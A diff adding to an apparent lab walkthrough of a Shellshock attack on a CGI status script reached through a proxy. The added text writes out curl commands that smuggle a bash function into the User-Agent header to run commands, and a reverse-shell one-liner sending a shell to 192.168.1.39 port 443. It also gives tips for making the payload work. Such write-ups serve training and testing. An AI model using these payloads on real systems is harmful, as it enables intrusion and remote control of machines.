@@ -168,6 +168,51 @@ curl -s http://127.0.0.1/cgi-bin/status --proxy http://192.168.1.38:3128 | jq
 
 `jq` --> Command to see better the json files
 
+In this case we are going to util this:
+
+````bash
+curl -s http://127.0.0.1/cgi-bin/status --proxy http://192.168.1.38:3128 -H "User-Agent: () { :; }; /usr/bin/whoami"
+````
+
+
+![](../../Images/Pasted%20image%2020230901143137.png)
+
+If you see at the first that the response don't return the output of the command you have to put echo; and the command
+
+Sometimes you have to put more than one echo;
+
+You have to use absolute paths to indicate the command, remember, in different system the path of the commands are different
+
+````bash
+curl -s http://127.0.0.1/cgi-bin/status --proxy http://192.168.1.38:3128 -H "User-Agent: () { :; }; echo; /usr/bin/whoami"
+````
+
+![](../../Images/Pasted%20image%2020230901143215.png)
+
+Now you can see that the output is ok
+
+---
+
+## Gaining access to the machine
+
+We can do the oneliner for gain access to the machine
+
+In shellshock is recommendable to put the **absolute path for the bash **
+
+````bash
+curl -s http://127.0.0.1/cgi-bin/status --proxy http://192.168.1.38:3128 -H "User-Agent: () { :; }; echo; /bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.1.39/443 0>&1'" 
+````
+
+In some system will be /bin/bash or /usr/bin/bash
+
+In this case is /bin/bash
+
+We listening in 443 port and send the malicious curl request
+
+And nice!! We gain access to the machine
+
+![](../../Images/Pasted%20image%2020230901144013.png)
+
 
 
 ---
